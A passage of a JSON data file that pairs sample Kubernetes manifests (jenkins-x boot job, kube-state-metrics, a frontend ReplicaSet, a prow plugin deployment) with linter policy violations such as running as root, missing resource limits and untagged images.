jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-boot-job\" not found"
  },
  {
    "id": "3313",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"git-clone\" is not set to runAsNonRoot"
  },
  {
    "id": "3314",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job\" is not set to runAsNonRoot"
  },
  {
    "id": "3315",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"git-clone\" has cpu request 0"
  },
  {
    "id": "3316",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job\" has cpu request 0"
  },
  {
    "id": "3317",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"git-clone\" has memory limit 0"
  },
  {
    "id": "3318",
    "manifest_path": "data/manifests/the_stack_sample/sample_1027.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone ${GIT_URL} ${GIT_SUB_DIR}; echo cloned\n          url: $(inputs.params.url) to dir: ${GIT_SUB_DIR}; cd ${GIT_SUB_DIR}; git\n          checkout ${GIT_REVISION}; echo checked out revision: ${GIT_REVISION} to\n          dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio-labs-private/jx-cli:0.0.294\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job\" has memory limit 0"
  },
  {
    "id": "3319",
    "manifest_path": "data/manifests/the_stack_sample/sample_1028.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-state-metrics\" does not have a read-only root file system"
  },
  {
    "id": "3320",
    "manifest_path": "data/manifests/the_stack_sample/sample_1028.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kube-state-metrics\" not found"
  },
  {
    "id": "3321",
    "manifest_path": "data/manifests/the_stack_sample/sample_1028.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-state-metrics\" has cpu request 0"
  },
  {
    "id": "3322",
    "manifest_path": "data/manifests/the_stack_sample/sample_1028.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 2.0.0\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 2.0.0\n    spec:\n      containers:\n      - image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.0.0\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-state-metrics\" has memory limit 0"
  },
  {
    "id": "3323",
    "manifest_path": "data/manifests/the_stack_sample/sample_1029.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    foo.com/duname: casacl\n    foo.com/duversion: 1.6.9-20190923.1569266206874\n    foo.com/version: 1.6.9\n  labels:\n    app.kubernetes.io/name: casaccessmanagement\n    helm.sh/chart: casaccessmanagement-1.6.9\n  name: casaccessmanagement\nspec:\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: http\n  selector:\n    app.kubernetes.io/name: casaccessmanagement\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/name:casaccessmanagement])"
  },
  {
    "id": "3324",
    "manifest_path": "data/manifests/the_stack_sample/sample_1031.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: sergii703/frontend\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: Test\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"server\" is using an invalid container image, \"sergii703/frontend\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "3325",
    "manifest_path": "data/manifests/the_stack_sample/sample_1031.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: sergii703/frontend\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: Test\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "3326",
    "manifest_path": "data/manifests/the_stack_sample/sample_1031.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: sergii703/frontend\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: Test\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"server\" does not have a read-only root file system"
  },
  {
    "id": "3327",
    "manifest_path": "data/manifests/the_stack_sample/sample_1031.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: sergii703/frontend\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: Test\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "3328",
    "manifest_path": "data/manifests/the_stack_sample/sample_1031.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: sergii703/frontend\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: Test\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "3329",
    "manifest_path": "data/manifests/the_stack_sample/sample_1031.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n    spec:\n      containers:\n      - name: server\n        image: sergii703/frontend\n        env:\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: Test\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "3330",
    "manifest_path": "data/manifests/the_stack_sample/sample_1032.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210601-df2711fc5c\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"needs-rebase\" does not have a read-only root file system"
  },
  {
    "id": "3331",
    "manifest_path": "data/manifests/the_stack_sample/sample_1032.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210601-df2711fc5c\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"needs-rebase\" is not set to runAsNonRoot"
  },
  {
    "id": "3332",
    "manifest_path": "data/manifests/the_stack_sample/sample_1032.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20210601-df2711fc5c\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"needs-rebase\" has cpu request 0"
  },
  {
    "id": "3333",
    "manifest_path": "data/manifests/the_stack_sample/sample_1032.yaml",
